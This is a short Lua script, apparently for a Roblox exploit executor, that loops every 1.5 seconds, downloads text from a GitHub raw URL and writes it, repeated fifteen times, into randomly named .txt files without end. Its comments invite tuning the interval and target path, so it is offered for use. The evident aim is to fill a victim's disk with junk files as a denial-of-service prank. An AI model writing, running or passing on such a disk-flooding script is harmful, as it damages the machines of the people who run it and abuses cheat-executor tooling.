while wait(1.5) do --editable,don't recommend going below 0.8 though
local b = tostring(game:HttpGet("https://raw.githubusercontent.com/nadic/vale/main/sefg.txt", true))
    function generate_letters(amount)
    local serial = ""
    for i = 1, amount do
        serial = serial .. string.char(math.random(97,122)) .. '.txt'
    end
    writefile(serial, b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b)--Your path
end
generate_letters(20)
end
